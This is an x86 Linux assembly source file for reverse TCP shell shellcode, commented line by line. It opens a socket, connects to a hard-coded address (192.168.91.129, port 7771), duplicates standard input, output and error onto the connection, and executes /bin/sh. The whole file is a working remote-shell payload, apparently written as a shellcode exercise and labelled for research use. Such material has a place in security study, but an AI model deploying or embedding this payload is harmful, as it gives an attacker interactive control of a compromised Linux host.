; Title: Linux Reverse TCP Shell Shellcode
; Filename:reverse_shellcode.nasm
; Author: Oleg Boytsev
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

global _start
section .text

_start:

;The first step is to create an endpoint for communication and return a socket file descriptor: socket(int domain, int type, int protocol)
xor eax, eax	;zeroed eax
mov al, 102	;socketcall()
xor ebx, ebx	;zeroed ebx
mov bl, 1 	;net.h/SYS_SOCKET code 
xor esi, esi	;zeroed esi
push esi	;push 0 into stack (protocol)
push 1 		;push 1 into stack (SOCK_STREAM), man 2 socket
push 2 		;push 2 into stack (AF_INET), man 2 socket
mov ecx, esp 	;move a pointer to arguments array into ecx
int 0x80	;run syscall

mov edx, eax	;save socket fd into edx

;connect/man connect: int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
mov al, 102	;socketcall()
mov bl, 3       ;SYS_CONNECT

;const struct sockaddr *addr/man 2 ip: address family, port, internet address
push DWORD 0x815ba8c0   ;192.168.91.129 reversed and hexed

push WORD 0x5b1e        ;port 7771
push WORD 2             ;AF_INET
mov ecx, esp            ;move a pointer to struct sockaddr arguments into ecx

push 16                 ;addrlen 16
push ecx                ;struct sockaddr pointer
push edx                ;sockfd
mov ecx, esp            ;move a pointer to connect() arguments into ecx
int 0x80		;run syscall

;DUP2/man dup2: int dup2(int oldfd, int newfd); Duplicate a file descriptor
xor eax, eax	;zeroed eax
mov al, 63 	;dup2() code
mov ebx, edx 	;save old fd in ebx
xor ecx, ecx 	;get 0, this is STDIN file descriptor
int 0x80	;run syscall

xor eax, eax	;zeroed eax
mov al, 63	;mov dup2() code into al
mov cl, 1 	;STDOUT
int 0x80	;run syscall

mov al, 63	;dup2() code
mov cl, 2 	;STDERROR
int 0x80	;run syscall

;spawn a shell
xor eax, eax	;zeroed eax
push eax	;push NULL into stack
push 0x68732f2f	;push reversed //sh into stack
push 0x6e69622f	;push reversed /bin into stack
mov ebx, esp	;copy pointer to /bin//sh string into ebx
push eax	;push NULL into stack 
push ebx	;push pointer to /bin//sh into stack
mov ecx, esp	;mov pointer to argv[] (/bin/sh, NULL) into ecx
xor edx, edx	;zeroed edx (edx contain envp[])
mov al, 0xb	;mov execve() code into al
int 0x80	;run syscall
